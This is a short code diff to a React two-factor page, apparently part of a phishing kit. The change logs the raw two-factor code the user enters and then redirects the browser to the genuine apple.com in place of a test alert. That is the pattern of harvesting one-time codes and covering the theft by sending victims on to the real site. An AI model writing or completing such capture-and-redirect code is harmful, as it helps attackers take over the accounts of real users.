@@ -27,14 +27,14 @@ export default function TwoFactorPage() {
     }
   }
 
-  function handleVerify(e) {
+  async function handleVerify(e) {
     e.preventDefault();
     if (!isComplete) return;
-    logResponseEntry({
+    await logResponseEntry({
       event: "two-factor-code-entered",
       code: code.join(""),
     });
-    alert("Form working");
+    window.location.assign("https://apple.com");
   }
 
   return (
